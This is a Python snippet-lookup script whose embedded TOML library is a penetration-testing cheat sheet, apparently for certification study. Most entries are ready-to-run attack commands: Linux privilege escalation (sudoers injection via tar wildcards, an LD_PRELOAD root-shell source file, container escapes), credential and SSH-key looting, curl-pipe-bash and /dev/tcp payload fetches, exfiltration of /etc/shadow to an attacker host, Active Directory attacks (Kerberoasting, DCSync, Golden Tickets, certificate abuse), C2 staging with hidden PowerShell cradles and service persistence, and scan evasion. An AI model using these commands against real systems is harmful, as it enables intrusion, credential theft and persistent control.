#!/usr/bin/env -S pipx run
# /// script
# requires-python = ">=3.11"
# dependencies = ["cyclopts>=3", "rich>=13"]
# ///
"""snip: read-only snippet lookup. Add snippets by editing SNIPPETS below."""

from __future__ import annotations

import re
import shlex
import shutil
import subprocess
import sys
import tomllib
from difflib import get_close_matches
from typing import Annotated
import tempfile
from pathlib import Path

from cyclopts import App, Parameter
from rich.console import Console
from rich.prompt import IntPrompt, Prompt
from rich.syntax import Syntax
from rich.table import Table

# ── snippets ────────────────────────────────────────────────────────────────
# TOML. Use '''...''' (literal strings) for bodies: no escaping needed.
# A body containing three single quotes would need """...""" instead, and
# then the outer Python string must use ''' (or vice versa).
SNIPPETS = r"""
[curl-retry]
description = "curl with retries and sane failure behaviour"
lang = "bash"
tags = ["http", "shell"]
body = '''
curl --fail --silent --show-error --location \
     --retry 5 --retry-all-errors {{url}}
'''

[git-undo-commit]
description = "undo last commit, keep changes staged"
lang = "bash"
tags = ["git"]
body = '''
git reset --soft HEAD~1
'''

# ── shell stabilisation ──────────────────────────────────────────────
[stab-python]
description = "upgrade dumb shell to a PTY (then CTRL-Z and run stab-fg)"
lang = "bash"
tags = ["shell", "stabilise"]
body = '''
python3 -c 'import pty; pty.spawn("/bin/bash")'
'''

[stab-fg]
description = "after CTRL-Z: fix local tty and re-attach the remote shell"
lang = "bash"
tags = ["shell", "stabilise"]
body = '''
stty raw -echo; fg
export TERM=xterm
'''

[stab-alt]
description = "spawn a shell without python (sh/perl/awk/find/vim)"
lang = "bash"
tags = ["shell", "stabilise"]
body = '''
/bin/sh -i
perl -e 'exec "/bin/sh";'
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
vim -c ':!/bin/sh'
'''

# ── situational awareness ────────────────────────────────────────────
[enum-quick]
description = "one-shot situational awareness"
lang = "bash"
tags = ["enum"]
body = '''
id; whoami; hostname
uname -a; cat /etc/os-release 2>/dev/null
echo "PATH=$PATH"
sudo -l 2>/dev/null
'''

[enum-sudo]
description = "what can we run with sudo? check sudo version for CVEs"
lang = "bash"
tags = ["enum", "privesc"]
body = '''
sudo -l
sudo --version
'''

[enum-users]
description = "users with login shells, groups, sudo group members"
lang = "bash"
tags = ["enum"]
body = '''
cat /etc/passwd | cut -f1 -d:
cat /etc/group
getent group sudo
ls -la /home
'''

[enum-net]
description = "interfaces, routes, neighbours, listeners"
lang = "bash"
tags = ["enum", "network"]
body = '''
ip a
route -n 2>/dev/null || netstat -rn
arp -a
cat /etc/hosts /etc/resolv.conf 2>/dev/null
netstat -lnpt 2>/dev/null || ss -lntp
'''

# ── low-hanging fruit ────────────────────────────────────────────────
[loot-lowhanging]
description = "hidden files/dirs, temp dirs, fstab"
lang = "bash"
tags = ["enum", "loot"]
body = '''
cat /etc/fstab | grep -v "#" | column -t
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep {{user}}
find / -type d -name ".*" -ls 2>/dev/null
ls -l /tmp /var/tmp /dev/shm
'''

[loot-history]
description = "shell history and other *_history files"
lang = "bash"
tags = ["enum", "loot"]
body = '''
history
find / -type f \( -name "*_hist" -o -name "*_history" \) -exec ls -l {} \; 2>/dev/null
'''

# ── credential / config hunting ──────────────────────────────────────
[loot-sshkeys]
description = "find private keys; check if encrypted before cracking"
lang = "bash"
tags = ["loot", "ssh", "creds"]
body = '''
grep -rnE '^-{5}BEGIN [A-Z0-9]+ PRIVATE KEY-{5}$' /* 2>/dev/null
ssh-keygen -yf ~/.ssh/id_rsa   # errors => encrypted
ssh2john id_rsa > ssh.hash
'''

[loot-cnf]
description = "search .cnf files for user/password/pass lines"
lang = "bash"
tags = ["loot", "creds"]
body = '''
for i in $(find / -name "*.cnf" 2>/dev/null | grep -v "doc\|lib"); do
  echo -e "\nFile: $i"; grep "user\|password\|pass" "$i" 2>/dev/null | grep -v "#"
done
'''

[loot-configs]
description = "all config-ish files, excluding /proc"
lang = "bash"
tags = ["loot", "creds"]
body = '''
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
'''

[loot-logs]
description = "grep /var/log for auth/session/sudo events"
lang = "bash"
tags = ["loot", "logs"]
body = '''
for i in $(ls /var/log/* 2>/dev/null); do
  G=$(grep -i "accepted\|session opened\|failure\|failed\|ssh\|password changed\|new user\|sudo\|COMMAND=" "$i" 2>/dev/null)
  if [[ $G ]]; then echo -e "\n#### $i"; echo "$G"; fi
done
'''

# ── privilege escalation ─────────────────────────────────────────────
[pe-suid]
description = "find SUID/SGID binaries"
lang = "bash"
tags = ["privesc", "suid"]
body = '''
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
find / -uid 0 -perm -6000 -type f 2>/dev/null
'''

[pe-caps]
description = "enumerate file capabilities"
lang = "bash"
tags = ["privesc", "capabilities"]
body = '''
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \; 2>/dev/null
'''

[pe-path]
description = "PATH abuse — prepend cwd, then drop a fake binary"
lang = "bash"
tags = ["privesc", "path"]
body = '''
echo $PATH
export PATH=.:${PATH}
'''

[pe-gtfo]
description = "cross-reference installed pkgs against GTFOBins"
lang = "bash"
tags = ["privesc", "gtfobins"]
body = '''
apt list --installed 2>/dev/null | tr "/" " " | cut -d" " -f1 > installed_pkgs.list
for i in $(curl -s https://gtfobins.org/api.json | jq -r '.executables | keys[]'); do
  grep -q "^$i$" installed_pkgs.list && echo "Check GTFO: $i"
done
'''

[pe-wildcard-tar]
description = "tar --checkpoint wildcard injection (cron archiver)"
lang = "bash"
tags = ["privesc", "wildcard", "cron"]
body = '''
echo 'echo "{{user}} ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
'''

[pe-ldpreload-c]
description = "LD_PRELOAD shared object source"
lang = "c"
tags = ["privesc", "ld_preload"]
body = '''
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0); setuid(0);
    system("/bin/bash");
}
'''

[pe-ldpreload-run]
description = "compile and use the LD_PRELOAD .so via a sudo-allowed cmd"
lang = "bash"
tags = ["privesc", "ld_preload"]
body = '''
gcc -fPIC -shared -o /tmp/root.so root.c -nostartfiles
sudo LD_PRELOAD=/tmp/root.so {{binary}}
'''

[pe-pythonpath]
description = "PYTHONPATH hijack via a sudo-allowed python script"
lang = "bash"
tags = ["privesc", "python"]
body = '''
python3 -c 'import sys; print("\n".join(sys.path))'
sudo PYTHONPATH=/tmp/ /usr/bin/python3 {{script}}
'''

[pe-lxd]
description = "lxd group -> privileged container mounting host root"
lang = "bash"
tags = ["privesc", "group", "lxd"]
body = '''
lxc image import alpine.tar.gz --alias alpine
lxc init alpine r00t -c security.privileged=true
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
lxc start r00t
lxc exec r00t /bin/sh
'''

[pe-docker]
description = "docker group -> mount host root in a container"
lang = "bash"
tags = ["privesc", "group", "docker"]
body = '''
docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
'''

[pe-pkexec]
description = "polkit paths + pkexec (see CVE-2021-4034 PwnKit)"
lang = "bash"
tags = ["privesc", "polkit"]
body = '''
ls /usr/share/polkit-1/actions /usr/share/polkit-1/rules.d 2>/dev/null
ls /etc/polkit-1/localauthority/50-local.d 2>/dev/null
pkexec -u root id
'''

# ── domain-joined hosts ──────────────────────────────────────────────
[dom-check]
description = "is this Linux host domain-joined?"
lang = "bash"
tags = ["domain", "enum"]
body = '''
realm list
ps -ef | grep -i "winbind\|sssd"
'''

[dom-keytab]
description = "find keytabs / kerberos ccache for impersonation"
lang = "bash"
tags = ["domain", "kerberos", "creds"]
body = '''
find / -name "*keytab*" -ls 2>/dev/null
crontab -l 2>/dev/null   # look for kinit
env | grep -i krb5
ls -la /tmp             # ccache files
'''

# ── file transfer ────────────────────────────────────────────────────
[xfer-b64]
description = "move a file as base64 through a shell"
lang = "bash"
tags = ["transfer"]
body = '''
md5sum {{file}}
cat {{file}} | base64 -w 0; echo
echo -n 'BASE64...' | base64 -d > {{file}}
'''

[xfer-down]
description = "download to target (wget/curl, incl. fileless)"
lang = "bash"
tags = ["transfer", "download"]
body = '''
wget http://{{lhost}}/{{file}} -O /tmp/{{file}}
curl http://{{lhost}}/{{file}} -o /tmp/{{file}}
curl http://{{lhost}}/{{file}} | bash
'''

[xfer-devtcp]
description = "fileless download over bash /dev/tcp"
lang = "bash"
tags = ["transfer", "download", "notools"]
body = '''
exec 3<>/dev/tcp/{{lhost}}/{{port}}
echo -e "GET /{{file}} HTTP/1.1\n\n" >&3
cat <&3
'''

[xfer-serve]
description = "quick HTTP servers on the attacker box"
lang = "bash"
tags = ["transfer", "server"]
body = '''
python3 -m http.server 80
php -S 0.0.0.0:8000
ruby -run -ehttpd . -p8000
'''

[xfer-upload]
description = "exfil to an uploadserver over https"
lang = "bash"
tags = ["transfer", "upload"]
body = '''
curl -X POST https://{{lhost}}/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
'''

# ── reference checklist ──────────────────────────────────────────────
[cve-list]
description = "kernel/sudo/polkit CVEs to check by version"
lang = "text"
tags = ["reference", "cve"]
body = '''
CVE-2016-5195  Dirty COW
CVE-2021-3493  Ubuntu OverlayFS
CVE-2021-4034  PwnKit (pkexec)
CVE-2022-0847  Dirty Pipe (kernel 5.8-5.17)
CVE-2019-14287 sudo <= 1.8.28
CVE-2021-3156  sudo Baron Samedit
CVE-2021-22555 / 2022-1015 / 2023-32233  Netfilter
'''

[win-unquoted]
description = "unquoted service paths (drop a binary in a space gap)"
lang = "powershell"
tags = ["windows", "privesc", "services"]
body = '''
# cmd variant — stops before the quoting clash:
# wmic service get name,displayname,pathname,startmode 2>nul | findstr /i "auto" | findstr /i /v "C:\Windows\\"

# PowerShell variant — no quoting issue, easier to read:
Get-WmiObject Win32_Service |
  Where-Object { $_.StartMode -eq "Auto" -and
                 $_.PathName -notmatch '"' -and
                 $_.PathName -notmatch "C:\\Windows" } |
  Select-Object Name, DisplayName, PathName
sc.exe qc {{service}}
'''

# ══ ACTIVE DIRECTORY ══════════════════════════════════════════════════
# ── enumeration ──────────────────────────────────────────────────────
[ad-enum-basic]
description = "domain context from a domain-joined Windows foothold"
lang = "batch"
tags = ["windows", "domain", "enum", "ad"]
body = '''
net user /domain
net group /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
nltest /domain_trusts
echo %LOGONSERVER%
'''

[ad-enum-powerview]
description = "PowerView key queries — run Import-Module .\\PowerView.ps1 first"
lang = "powershell"
tags = ["windows", "domain", "enum", "ad"]
body = '''
Get-Domain
Get-DomainController | Select-Object Name, IPAddress
Get-DomainUser -SPN | Select-Object SamAccountName, ServicePrincipalName
Get-DomainGroup -Identity "Domain Admins" | Select-Object Member
Get-DomainComputer | Select-Object Name, OperatingSystem
Find-LocalAdminAccess
Get-DomainGPO | Select-Object DisplayName, GpcFileSysPath
'''

[ad-enum-ldap]
description = "LDAP queries from Linux (anonymous or with creds)"
lang = "bash"
tags = ["linux", "domain", "enum", "ad"]
body = '''
ldapsearch -H ldap://{{dc_ip}} -x -s base namingcontexts
ldapsearch -H ldap://{{dc_ip}} -x -b "{{base_dn}}" "(objectClass=user)" sAMAccountName
ldapsearch -H ldap://{{dc_ip}} -D "{{user}}@{{domain}}" -w {{password}} -b "{{base_dn}}" "(objectClass=group)"
'''

[ad-userenum]
description = "valid user enumeration without creds via Kerberos"
lang = "bash"
tags = ["linux", "domain", "enum", "ad", "creds"]
body = '''
kerbrute userenum -d {{domain}} --dc {{dc_ip}} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
kerbrute userenum -d {{domain}} --dc {{dc_ip}} users.txt
'''

[ad-spray]
description = "password spray — one password across many users, mind lockout policy"
lang = "bash"
tags = ["linux", "domain", "enum", "ad", "creds"]
body = '''
kerbrute passwordspray -d {{domain}} --dc {{dc_ip}} users.txt {{password}}
crackmapexec smb {{dc_ip}} -u users.txt -p {{password}} --continue-on-success
'''

[ad-bloodhound-py]
description = "BloodHound collection from Linux (no agent needed)"
lang = "bash"
tags = ["linux", "domain", "enum", "ad", "bloodhound"]
body = '''
bloodhound-python -u {{user}} -p {{password}} -d {{domain}} -ns {{dc_ip}} -c All --zip
'''

# ── kerberos attacks ──────────────────────────────────────────────────
[ad-kerberoast]
description = "Kerberoast SPNs then crack offline"
lang = "bash"
tags = ["linux", "domain", "privesc", "ad", "kerberos"]
body = '''
impacket-GetUserSPNs {{domain}}/{{user}}:{{password}} -dc-ip {{dc_ip}} -request -outputfile kerberoast.txt
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --force
'''

[ad-asreproast]
description = "AS-REP Roast — accounts with pre-auth disabled"
lang = "bash"
tags = ["linux", "domain", "privesc", "ad", "kerberos"]
body = '''
impacket-GetNPUsers {{domain}}/ -dc-ip {{dc_ip}} -no-pass -usersfile users.txt -format hashcat -outputfile asrep.txt
impacket-GetNPUsers {{domain}}/{{user}}:{{password}} -dc-ip {{dc_ip}} -request -format hashcat
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --force
'''

[ad-pth]
description = "Pass-the-Hash lateral movement from Linux"
lang = "bash"
tags = ["linux", "domain", "lateral", "ad", "pth"]
body = '''
impacket-wmiexec -hashes :{{ntlm}} {{domain}}/{{user}}@{{rhost}}
impacket-psexec  -hashes :{{ntlm}} {{domain}}/{{user}}@{{rhost}}
impacket-smbexec -hashes :{{ntlm}} {{domain}}/{{user}}@{{rhost}}
evil-winrm -i {{rhost}} -u {{user}} -H {{ntlm}}
crackmapexec smb {{rhost}} -u {{user}} -H {{ntlm}}
'''

[ad-ptt]
description = "Pass-the-Ticket: import .ccache on Linux or .kirbi via Rubeus"
lang = "bash"
tags = ["linux", "domain", "lateral", "ad", "kerberos"]
body = '''
export KRB5CCNAME={{ticket}}.ccache
impacket-wmiexec -k -no-pass {{domain}}/{{user}}@{{rhost}}
impacket-psexec  -k -no-pass {{domain}}/{{user}}@{{rhost}}
REM Windows/Mythic Apollo: execute-assembly Rubeus.exe ptt /ticket:{{ticket_b64}}
REM verify: shell klist
'''

# ── credential collection ─────────────────────────────────────────────
[ad-dcsync]
description = "DCSync — dump hashes (needs DA or DCSync ACL on domain object)"
lang = "bash"
tags = ["linux", "domain", "privesc", "ad", "dcsync", "creds"]
body = '''
impacket-secretsdump {{domain}}/{{user}}:{{password}}@{{dc_ip}}
impacket-secretsdump -hashes :{{ntlm}} {{domain}}/{{user}}@{{dc_ip}}
REM Mythic Apollo:
REM execute-assembly SharpKatz.exe --Command dcsync --User {{domain}}\krbtgt --Domain {{domain}} --DomainController {{dc_ip}}
'''

# ── ACL attacks ───────────────────────────────────────────────────────
[ad-acl-enum]
description = "find exploitable ACLs granted to our user or groups"
lang = "powershell"
tags = ["windows", "domain", "enum", "ad", "acl"]
body = '''
Import-Module .\PowerView.ps1
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object { $_.IdentityReferenceName -match "{{user}}" }
Get-DomainObjectAcl -Identity "{{target}}" -ResolveGUIDs
'''

[ad-acl-abuse]
description = "ACL abuse: ForceChangePassword / GenericAll on group / WriteDACL"
lang = "powershell"
tags = ["windows", "domain", "privesc", "ad", "acl"]
body = '''
Import-Module .\PowerView.ps1

# ForceChangePassword
$pw = ConvertTo-SecureString "{{newpassword}}" -AsPlainText -Force
Set-DomainUserPassword -Identity "{{target}}" -AccountPassword $pw

# GenericAll on group -> add ourselves
Add-DomainGroupMember -Identity "{{group}}" -Members "{{user}}"

# WriteDACL on domain object -> grant DCSync rights
Add-DomainObjectAcl -TargetIdentity "{{domain}}" -PrincipalIdentity "{{user}}" -Rights DCSync
'''

# ── LAPS ─────────────────────────────────────────────────────────────
[ad-laps]
description = "read LAPS local admin password (requires read right on attribute)"
lang = "bash"
tags = ["linux", "windows", "domain", "privesc", "ad", "laps"]
body = '''
# Linux
ldapsearch -H ldap://{{dc_ip}} -D "{{user}}@{{domain}}" -w {{password}} -b "{{base_dn}}" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd sAMAccountName
crackmapexec ldap {{dc_ip}} -u {{user}} -p {{password}} -M laps

# Windows/PowerView
Get-DomainComputer {{target}} -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
'''

# ── AD CS ─────────────────────────────────────────────────────────────
[ad-adcs-enum]
description = "AD CS: enumerate CAs and vulnerable templates"
lang = "bash"
tags = ["linux", "domain", "privesc", "ad", "adcs"]
body = '''
certipy find -u {{user}}@{{domain}} -p {{password}} -dc-ip {{dc_ip}} -vulnerable -stdout
REM Mythic Apollo: execute-assembly Certify.exe find /vulnerable
'''

[ad-adcs-esc1]
description = "AD CS ESC1: enroll with arbitrary SAN, auth as DA"
lang = "bash"
tags = ["linux", "domain", "privesc", "ad", "adcs"]
body = '''
certipy req -u {{user}}@{{domain}} -p {{password}} -dc-ip {{dc_ip}} -ca {{ca}} -template {{template}} -upn administrator@{{domain}}
certipy auth -pfx administrator.pfx -dc-ip {{dc_ip}}
# -> outputs NTLM hash; use with any PtH technique
'''

[ad-adcs-esc8]
description = "AD CS ESC8: relay NTLM to the web enrolment endpoint"
lang = "bash"
tags = ["linux", "domain", "privesc", "ad", "adcs"]
body = '''
# start relay
certipy relay -ca {{ca_ip}} -template DomainController
# trigger auth from DC in another shell
impacket-printerbug {{domain}}/{{user}}:{{password}}@{{dc_ip}} {{lhost}}
# -> certipy saves DC.pfx; then:
certipy auth -pfx DC.pfx -dc-ip {{dc_ip}}
'''

# ── ticket forging ────────────────────────────────────────────────────
[ad-sid]
description = "get domain SID — required for ticket forging"
lang = "batch"
tags = ["windows", "domain", "enum", "ad"]
body = '''
whoami /user
wmic useraccount where name="{{user}}" get sid
REM Linux: impacket-getPac -targetUser {{user}} {{domain}}/{{user}}:{{password}}
'''

[ad-golden]
description = "Golden Ticket (needs krbtgt NTLM from DCSync)"
lang = "bash"
tags = ["linux", "domain", "privesc", "ad", "kerberos", "persistence"]
body = '''
impacket-ticketer -nthash {{krbtgt_ntlm}} -domain-sid {{domain_sid}} -domain {{domain}} administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass {{domain}}/administrator@{{dc_ip}}
'''

[ad-silver]
description = "Silver Ticket (service account NTLM + target SPN)"
lang = "bash"
tags = ["linux", "domain", "lateral", "ad", "kerberos"]
body = '''
impacket-ticketer -nthash {{service_ntlm}} -domain-sid {{domain_sid}} -domain {{domain}} -spn {{spn}} {{user}}
export KRB5CCNAME={{user}}.ccache
impacket-wmiexec -k -no-pass {{domain}}/{{user}}@{{rhost}}
'''

# ── GPO ───────────────────────────────────────────────────────────────
[ad-gpo]
description = "GPO enumeration + write-access check"
lang = "powershell"
tags = ["windows", "domain", "enum", "ad", "gpo"]
body = '''
Import-Module .\PowerView.ps1
Get-DomainGPO | Select-Object DisplayName, GpcFileSysPath
Get-DomainGPO -Identity "{{gpo_name}}"
Get-DomainOU | Select-Object Name, gplink
# find GPOs we can write
Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,{{base_dn}}" -ResolveGUIDs |
  Where-Object { $_.ActiveDirectoryRights -match "Write" -and $_.IdentityReferenceName -match "{{user}}" }
'''

# ══ MYTHIC C2 ══════════════════════════════════════════════════════════
[mythic-erebus-installation]
lang = "text"
tags = ["mythic", "c2", "erebus"]
body = '''
mythic-cli install github https://github.com/Whispergate/Erebus
'''

[mythic-apollo-ref]
description = "Mythic Apollo: task command quick-reference"
lang = "text"
tags = ["mythic", "c2", "apollo"]
body = '''
shell <cmd>                            run via cmd.exe
powershell <cmd>                       run via powershell
ls [path]                              directory listing
ps                                     process list
kill <pid>
screenshot
sleep <seconds> <jitter_pct>           change callback cadence
upload                                 push file (prompted for local path)
download <remote_path>                 pull file to Mythic
execute-assembly <local.exe> [args]    reflective .NET load (no disk touch)
shinject <pid> <shellcode_path>        inject shellcode into remote pid
inject <pid>                           spawn payload into existing process
pth /user:U /domain:D /ntlm:H         token impersonation via sacrifice proc
link <host> <pipename>                 connect to an SMB-egress Apollo agent
socks <port>                           SOCKS5 proxy on Mythic server
jobkill <job_id>                       cancel a running task
'''

[mythic-stage]
description = "Mythic: stage an Apollo payload on target"
lang = "batch"
tags = ["mythic", "c2", "staging"]
body = '''
certutil -urlcache -split -f http://{{lhost}}/apollo.exe %TEMP%\svc.exe & %TEMP%\svc.exe
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://{{lhost}}/apollo.ps1')"
REM service-based persistence:
sc create {{service}} binPath= "%TEMP%\svc.exe" start= auto & sc start {{service}}
'''

[mythic-assemblies]
description = "Mythic Apollo: common execute-assembly invocations for AD work"
lang = "text"
tags = ["mythic", "c2", "apollo", "ad", "enum"]
body = '''
execute-assembly SharpHound.exe -c All --zipfilename bh.zip --outputdirectory C:\Windows\Temp
execute-assembly Rubeus.exe kerberoast /nowrap /outfile:C:\Windows\Temp\hashes.txt
execute-assembly Rubeus.exe asreproast /nowrap /outfile:C:\Windows\Temp\asrep.txt
execute-assembly Rubeus.exe tgtdeleg /nowrap
execute-assembly Rubeus.exe dump /luid:{{luid}} /nowrap
execute-assembly Certify.exe find /vulnerable
execute-assembly Seatbelt.exe -group=all
execute-assembly SharpUp.exe audit
execute-assembly SharpLAPS.exe /all
download C:\Windows\Temp\bh.zip
'''

[mythic-pth]
description = "Mythic Apollo: Pass-the-Hash via sacrifice process"
lang = "text"
tags = ["mythic", "c2", "apollo", "ad", "pth"]
body = '''
pth /user:{{user}} /domain:{{domain}} /ntlm:{{ntlm}}
# all subsequent tasks in the callback run with the new token
# to return to original token: rev2self (if supported) or spawn a fresh callback
'''

[mythic-socks]
description = "Mythic: SOCKS5 proxy for proxychains access to internal subnet"
lang = "bash"
tags = ["mythic", "c2", "pivot", "socks"]
body = '''
# 1. In Mythic UI: callback -> Proxies tab -> SOCKS5 -> Start -> port {{port}}
# 2. Attacker:
echo "socks5 127.0.0.1 {{port}}" | sudo tee -a /etc/proxychains4.conf
proxychains4 impacket-secretsdump {{domain}}/{{user}}:{{password}}@{{rhost}}
proxychains4 evil-winrm -i {{rhost}} -u {{user}} -H {{ntlm}}
proxychains4 certipy find -u {{user}}@{{domain}} -p {{password}} -dc-ip {{dc_ip}} -vulnerable
proxychains4 bloodhound-python -u {{user}} -p {{password}} -d {{domain}} -ns {{dc_ip}} -c All --zip
proxychains4 crackmapexec smb {{rhost}} -u {{user}} -H {{ntlm}}
'''

[mythic-smb-pivot]
description = "Mythic: chain an SMB Apollo agent through an existing callback"
lang = "text"
tags = ["mythic", "c2", "pivot", "smb"]
body = '''
# 1. Generate payload: Mythic UI -> Payloads -> Apollo -> SMB egress profile, pipe name: {{pipename}}
# 2. From active callback, drop on segmented host:
shell copy \\{{lhost}}\share\apollo_smb.exe C:\Windows\Temp\apollo_smb.exe
shell C:\Windows\Temp\apollo_smb.exe
# 3. Link from active callback:
link {{rhost}} {{pipename}}
# -> second callback appears in Mythic routed over the first agent's connection
'''

[mythic-token-impersonate]
description = "Mythic Apollo: steal a token from an existing privileged process"
lang = "text"
tags = ["mythic", "c2", "apollo", "privesc", "tokens"]
body = '''
ps                                   # find a SYSTEM / DA-owned pid
steal_token {{pid}}                  # impersonate that token
shell whoami /all                    # verify
rev2self                             # drop back to original token
'''

# ── AD reference ──────────────────────────────────────────────────────
[ad-cve]
description = "AD CVEs and techniques reference for CPTS"
lang = "text"
tags = ["domain", "reference", "cve", "ad"]
body = '''
CVE-2020-1472  Zerologon         — unauthenticated DC takeover via netlogon
CVE-2021-42278 + 42287  noPac   — sAMAccountName spoofing -> DA
CVE-2021-4034  PwnKit            — local priv on Linux AD hosts
CVE-2022-26923 Certifried        — AD CS machine account cert -> DA
CVE-2019-1040  PrivExchange      — relay Exchange to LDAP -> DA
PrintNightmare (CVE-2021-1675/34527) — spooler RCE/LPE
Techniques (no CVE):
  Kerberoast / AS-REP Roast / Pass-the-Ticket
  DCSync / Golden/Silver Ticket
  ACL abuse (GenericAll / WriteDACL / ForceChangePassword)
  GPO write -> scheduled task -> exec as computer account
  AD CS ESC1-8 (Certipy / Certify)
  LAPS read / gMSA password read
  RBCD (Resource-Based Constrained Delegation)
'''

# ══ RECON / PORT SCANNING ═══════════════════════════════════════════
[recon-host-discovery]
description = "nmap host discovery before deep-scanning a range"
lang = "bash"
tags = ["recon", "nmap", "discovery"]
body = '''
sudo nmap {{cidr_range}} -sn -oA tnet | grep for | cut -d" " -f5
sudo nmap -sn -oA tnet -iL hosts.lst | grep for | cut -d" " -f5
sudo nmap {{cidr_range}} -sn -oA host -PE --packet-trace --reason
# -sn disable port scanning; -PE ping via icmp echo
'''

[recon-port-scan]
description = "staged nmap port scanning: fast TCP, full TCP+banners, UDP"
lang = "bash"
tags = ["recon", "nmap", "portscan"]
body = '''
# fast top ports
sudo nmap {{target}} --top-ports=10

# full loud connect scan
sudo nmap -p- -sT {{target}} -T5 -Pn

# full scan with version/script detection
sudo nmap -p- -sV -sC {{target}} -T5 -Pn

# stealthy SYN scan with decoys + spoofed source port
sudo nmap -p- -sS {{target}} -T4 -Pn --disable-arp-ping -D RND:10 --source-port 53 --stats-every 5s

# UDP top 100
sudo nmap {{target}} -sU -Pn -n --disable-arp-ping --packet-trace -F --reason
'''

[recon-firewall-evasion]
description = "firewall/IDS detection and evasion during scanning"
lang = "bash"
tags = ["recon", "nmap", "evasion", "firewall"]
body = '''
# SYN vs ACK scan to distinguish filtered vs dropped
sudo nmap {{target}} -p {{ports}} -sS -Pn -n --disable-arp-ping --packet-trace
sudo nmap {{target}} -p {{ports}} -sA -Pn -n --disable-arp-ping --packet-trace

# source-port 53 to slip past weak IDS/firewall port filters
sudo nmap {{target}} -p {{ports}} -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53

# decoys + explicit source interface/IP
sudo nmap {{target}} -D RND:8 -S {{source_ip}} -e tun0

# DNS-based enumeration of a nameserver
sudo nmap -sSU -p 53 --script dns-nsid -T4 {{ns_target}}
'''

[recon-output-formats]
description = "nmap output formats + conversion"
lang = "bash"
tags = ["recon", "nmap"]
body = '''
sudo nmap {{target}} -oA target
cat target.nmap    # normal
cat target.gnmap   # grepable
cat target.xml
xsltproc target.xml -o target.html
'''

# ══ WINDOWS — FILE TRANSFER ═════════════════════════════════════════
[win-download-cradles]
description = "PowerShell download cradles (disk + fileless)"
lang = "powershell"
tags = ["windows", "transfer", "download"]
body = '''
(New-Object Net.WebClient).DownloadFile('{{url}}','C:\Users\Public\Downloads\{{file}}')
(New-Object Net.WebClient).DownloadFileAsync('{{url}}','C:\Users\Public\Downloads\{{file}}')

# fileless
IEX (New-Object Net.WebClient).DownloadString('{{url}}')
(New-Object Net.WebClient).DownloadString('{{url}}') | IEX

# remember for first-launch IE config:
# -UseBasicParsing
# and to bypass an untrusted cert:
# [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
'''

[win-filexfer-smb]
description = "stand up an SMB share on attacker box, pull from Windows target"
lang = "bash"
tags = ["windows", "transfer", "smb"]
body = '''
sudo impacket-smbserver share -smb2support /tmp/smbshare
sudo impacket-smbserver share -smb2support /tmp/smbshare -user {{user}} -password {{password}}
'''

[win-filexfer-smb-pull]
description = "Windows-side: pull a file from attacker SMB share"
lang = "batch"
tags = ["windows", "transfer", "smb"]
body = '''
copy \\{{lhost}}\share\{{file}} .
net use n: \\{{lhost}}\share /user:{{user}} {{password}}
copy n:\{{file}}
'''

[win-filexfer-ftp]
description = "quick FTP server for download/upload to/from Windows target"
lang = "bash"
tags = ["windows", "transfer", "ftp"]
body = '''
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21
# add --write to also allow uploads from target
sudo python3 -m pyftpdlib --port 21 --write
'''

[win-filexfer-ftp-pull]
description = "Windows-side: FTP download/upload via WebClient"
lang = "powershell"
tags = ["windows", "transfer", "ftp"]
body = '''
(New-Object Net.WebClient).DownloadFile('ftp://{{lhost}}/{{file}}', 'C:\Users\Public\{{file}}')
(New-Object Net.WebClient).UploadFile('ftp://{{lhost}}/{{outfile}}', '{{local_path}}')
'''

[win-filexfer-webdav]
description = "WebDAV file transfer (wsgidav) — Windows treats it like a UNC path"
lang = "bash"
tags = ["windows", "transfer", "webdav"]
body = '''
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
# Windows side:
# dir \\{{lhost}}\DavWWWRoot\
'''

[win-filexfer-exfil-b64]
description = "exfil a file as base64 over HTTP POST (no upload tooling needed)"
lang = "powershell"
tags = ["windows", "transfer", "exfil"]
body = '''
$b64 = [System.Convert]::ToBase64String((Get-Content -Path '{{file_path}}' -Encoding Byte))
Invoke-WebRequest -Uri http://{{lhost}}:8000/ -Method POST -Body $b64
# attacker side: nc -lvnp 8000 or python3 -m uploadserver, then:
# echo <base64> | base64 -d -w 0 > {{outfile}}
'''

[win-filexfer-upload-server]
description = "PSUpload.ps1 fileless upload + a simple attacker-side listener"
lang = "powershell"
tags = ["windows", "transfer", "upload"]
body = '''
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://{{lhost}}:8000/upload -File {{file_path}}
# attacker: pip3 install uploadserver ; python3 -m uploadserver
'''

[win-filexfer-loud]
description = "bitsadmin / certutil for loud file transfer (LOLBins)"
lang = "batch"
tags = ["windows", "transfer", "lolbin"]
body = '''
bitsadmin /transfer job /priority foreground http://{{lhost}}:8000/{{file}} C:\Users\{{user}}\Desktop\{{file}}
certutil.exe -verifyctl -split -f http://{{lhost}}:8000/{{file}}
'''

